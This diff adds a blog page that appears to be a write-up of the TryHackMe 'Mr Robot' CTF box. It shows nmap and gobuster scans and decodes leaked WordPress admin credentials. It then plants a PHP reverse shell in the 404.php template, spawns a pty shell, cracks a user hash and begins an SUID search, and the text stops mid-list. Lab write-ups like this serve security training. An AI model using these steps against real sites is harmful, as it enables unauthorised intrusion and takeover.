@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:Rob]">
+<meta name="description" content="Walkthrough write up of the Mr Robot CTF box on tryhackme" />
+<meta name="keywords" content="cybersecurity, hacking, tryhackme, blog, blog, tryhackme, gobuster, nmap, wordpress, php" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://robscharf.github.io/posts/2022/05/thm-mr-robot-ctf-write-up/" />
+
+    <title>
+        rob@github
+    </title>
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://robscharf.github.io/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://robscharf.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://robscharf.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://robscharf.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://robscharf.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://robscharf.github.io/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://robscharf.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="THM: Mr Robot CTF - Write Up">
+<meta itemprop="description" content="Walkthrough write up of the Mr Robot CTF box on tryhackme"><meta itemprop="datePublished" content="2022-05-03T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-05-03T00:00:00+00:00" />
+<meta itemprop="wordCount" content="999"><meta itemprop="image" content="https://robscharf.github.io/"/>
+<meta itemprop="keywords" content="blog,tryhackme,gobuster,nmap,wordpress,php," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://robscharf.github.io/"/>
+
+<meta name="twitter:title" content="THM: Mr Robot CTF - Write Up"/>
+<meta name="twitter:description" content="Walkthrough write up of the Mr Robot CTF box on tryhackme"/>
+
+
+
+
+    <meta property="og:title" content="THM: Mr Robot CTF - Write Up" />
+<meta property="og:description" content="Walkthrough write up of the Mr Robot CTF box on tryhackme" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://robscharf.github.io/posts/2022/05/thm-mr-robot-ctf-write-up/" /><meta property="og:image" content="https://robscharf.github.io/"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-05-03T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-05-03T00:00:00+00:00" />
+
+
+
+
+
+    <meta property="article:section" content="ctf" />
+
+    <meta property="article:section" content="TryHackMe" />
+
+
+
+    <meta property="article:published_time" content="2022-05-03 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+<link rel="stylesheet" href='https://robscharf.github.io/style.css'>
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://robscharf.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">rob@github home $ </span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#46A69D;
+                   animation-duration:1s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://robscharf.github.io/about/">about</a></li><li><a href="https://robscharf.github.io/posts/">posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        5 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://robscharf.github.io/posts/2022/05/thm-mr-robot-ctf-write-up/">THM: Mr Robot CTF - Write Up</a>
+      </h1>
+
+      
+        <div class="post-excerpt">Walkthrough write up of the Mr Robot CTF box on tryhackme</div>
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <h1 id="thm---mr-robot">THM - Mr Robot</h1>
+<p>nmap</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap sudo nmap -sSV -v 10.10.165.139
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-05-10 12:12 EDT
+</span></span><span style="display:flex;"><span>NSE: Loaded <span style="color:#ae81ff">45</span> scripts <span style="color:#66d9ef">for</span> scanning.
+</span></span><span style="display:flex;"><span>Initiating Ping Scan at 12:12
+</span></span><span style="display:flex;"><span>Scanning 10.10.165.139 <span style="color:#f92672">[</span><span style="color:#ae81ff">4</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed Ping Scan at 12:12, 0.19s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating Parallel DNS resolution of <span style="color:#ae81ff">1</span> host. at 12:12
+</span></span><span style="display:flex;"><span>Completed Parallel DNS resolution of <span style="color:#ae81ff">1</span> host. at 12:12, 0.01s elapsed
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 12:12
+</span></span><span style="display:flex;"><span>Scanning 10.10.165.139 <span style="color:#f92672">[</span><span style="color:#ae81ff">1000</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 443/tcp on 10.10.165.139
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.10.165.139
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 12:12, 9.83s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1000</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating Service scan at 12:12
+</span></span><span style="display:flex;"><span>Scanning <span style="color:#ae81ff">2</span> services on 10.10.165.139
+</span></span><span style="display:flex;"><span>Completed Service scan at 12:13, 12.92s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">2</span> services on <span style="color:#ae81ff">1</span> host<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>NSE: Script scanning 10.10.165.139.
+</span></span><span style="display:flex;"><span>Initiating NSE at 12:13
+</span></span><span style="display:flex;"><span>Completed NSE at 12:13, 2.82s elapsed
+</span></span><span style="display:flex;"><span>Initiating NSE at 12:13
+</span></span><span style="display:flex;"><span>Completed NSE at 12:13, 1.27s elapsed
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.165.139
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.15s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE  SERVICE  VERSION
+</span></span><span style="display:flex;"><span>22/tcp  closed ssh
+</span></span><span style="display:flex;"><span>80/tcp  open   http     Apache httpd
+</span></span><span style="display:flex;"><span>443/tcp open   ssl/http Apache httpd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 27.44 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">2007</span> <span style="color:#f92672">(</span>88.284KB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">10</span> <span style="color:#f92672">(</span>416B<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>gobuster</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 10.10.165.139
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.1.0
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.165.139
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>2022/05/10 12:13:27 Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/.hta                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 213<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/.htaccess            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 218<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/.htpasswd            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 218<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/0                    <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/0/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/admin                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 235<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/admin/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/atom                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/feed/atom/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/audio                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 235<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/audio/<span style="color:#f92672">]</span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/blog                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 234<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/blog/<span style="color:#f92672">]</span>   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 233<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/css/<span style="color:#f92672">]</span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/dashboard            <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/wp-admin/<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/favicon.ico          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>                                      
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/feed                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/feed/<span style="color:#f92672">]</span>     
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/image                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/image/<span style="color:#f92672">]</span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/Image                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/Image/<span style="color:#f92672">]</span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 236<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/images/<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1188<span style="color:#f92672">]</span>                                   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/index.php            <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/<span style="color:#f92672">]</span>          
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/intro                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 516314<span style="color:#f92672">]</span>                                 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/js                   <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 232<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/js/<span style="color:#f92672">]</span>     
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/license              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 309<span style="color:#f92672">]</span>                                    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/login                <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/wp-login.php<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/page1                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/<span style="color:#f92672">]</span>            
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/phpmyadmin           <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 94<span style="color:#f92672">]</span>                                       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/readme               <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 64<span style="color:#f92672">]</span>                                       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/rdf                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/feed/rdf/<span style="color:#f92672">]</span>   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/robots               <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 41<span style="color:#f92672">]</span>                                       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/robots.txt           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 41<span style="color:#f92672">]</span>                                       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/rss                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/feed/<span style="color:#f92672">]</span>       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/rss2                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/feed/<span style="color:#f92672">]</span>       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/sitemap              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>                                        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/sitemap.xml          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>                                        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/video                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 235<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/video/<span style="color:#f92672">]</span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-admin             <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 238<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/wp-admin/<span style="color:#f92672">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-content           <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 240<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/wp-content/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-includes          <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 241<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/wp-includes/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-cron              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>                                          
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-config            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>                                          
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-links-opml        <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 227<span style="color:#f92672">]</span>                                        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-load              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>                                          
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-login             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 2613<span style="color:#f92672">]</span>                                       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-mail              <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3064<span style="color:#f92672">]</span>                                       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-settings          <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>                                          
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-signup            <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.165.139/wp-login.php?action<span style="color:#f92672">=</span>register<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/xmlrpc               <span style="color:#f92672">(</span>Status: 405<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 42<span style="color:#f92672">]</span>                                                       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/xmlrpc.php           <span style="color:#f92672">(</span>Status: 405<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 42<span style="color:#f92672">]</span>                                                       
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>2022/05/10 12:24:21 Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><p>WordPress is definitely installed. Let&rsquo;s investigate&hellip;</p>
+<p><code>http://10.10.165.139/robots.txt</code> yields:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>User-agent: *
+</span></span><span style="display:flex;"><span>fsocity.dic
+</span></span><span style="display:flex;"><span>key-1-of-3.txt
+</span></span></code></pre></div><p><code>fsocity.dic</code> is a dictionary wordlist file with many entries. This most likely contains the username and/or password of the WordPress installation.</p>
+<p><code>key-1-of-3.txt</code> has our first flag.</p>
+<p><code>http://10.10.165.139/license</code> gives us a text file with the following string hidden at the bottom:</p>
+<p><code>ZWxsaW90OkVSMjgtMDY1Mgo=</code></p>
+<p>This looks like base64, let us try to convert it. It works:</p>
+<p><img src="https://robscharf.github.io/media/mr-robot-burp-decode.png" alt="mr-robot-burp-decode"></p>
+<p>and gives us: <code>elliot:ER28-0652</code></p>
+<p><code>http://10.10.165.139/wp-login.php</code> gives us a WordPress log-in form.</p>
+<p>Using the credentials we have just discovered, we log-in to the administrator panel.</p>
+<p>Time to upload our PTM reverse shell script and obtain RCE.</p>
+<p>The WordPress media uploader does not allow us to upload <code>.php</code> files for security reasons. The form won&rsquo;t accept any variants like <code>.php2</code> either.</p>
+<p>Since WordPress is made up of <code>.php</code> files, let&rsquo;s try to edit an existing template file to add our script. I went ahead and used <code>404.php</code>, as it is easily accessible and, frankly, at the top of the list!</p>
+<p>That worked nicely!</p>
+<p><img src="https://robscharf.github.io/media/mr-robot-ptm.png" alt="mr-robot-ptm"></p>
+<p>We can then stabilize our shell via python with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>daemon@linux:/$ 
+</span></span></code></pre></div><p>and explore:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>daemon@linux:/$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
+</span></span><span style="display:flex;"><span>boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
+</span></span><span style="display:flex;"><span>daemon@linux:/$ cd home 
+</span></span><span style="display:flex;"><span>cd home
+</span></span><span style="display:flex;"><span>daemon@linux:/home$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>robot
+</span></span><span style="display:flex;"><span>daemon@linux:/home$ cd robot
+</span></span><span style="display:flex;"><span>cd robot
+</span></span><span style="display:flex;"><span>daemon@linux:/home/robot$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>key-2-of-3.txt	password.raw-md5
+</span></span><span style="display:flex;"><span>daemon@linux:/home/robot$ ls -la
+</span></span><span style="display:flex;"><span>ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> root  root  <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2015</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> root  root  <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2015</span> ..
+</span></span><span style="display:flex;"><span>-r-------- <span style="color:#ae81ff">1</span> robot robot   <span style="color:#ae81ff">33</span> Nov <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2015</span> key-2-of-3.txt
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> robot robot   <span style="color:#ae81ff">39</span> Nov <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2015</span> password.raw-md5
+</span></span></code></pre></div><p>We can&rsquo;t read <code>key-2-of-3.txt</code> yet, but we can access <code>password.raw-md5</code> for a hashed version of a password, likely for the <code>robot</code> user. We can use crackstation.com to crack it, and, if not, probaby John the Ripper.</p>
+<p>Luckily, crackstation.com reconizes the hash and gives us the decoded password:</p>
+<p><img src="https://robscharf.github.io/media/mr-robot-crackstation.png" alt="mr-robot-crackstation"></p>
+<p>We can now read <code>key-2-of-3.txt</code>. Now that we have gotten the second flag, let&rsquo;s look to escalate our privileges for root access and, presumably, the third flag.</p>
+<p>We can search for system files that have an SUID bit set:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>robot@linux:/tmp$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/bin/ping
+</span></span><span style="display:flex;"><span>/bin/umount
+</span></span><span style="display:flex;"><span>/bin/mount
+</span></span><span style="display:flex;"><span>/bin/ping6
+</span></span><span style="display:flex;"><span>/bin/su
+</span></span><span style="display:flex;"><span>/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/usr/bin/chfn
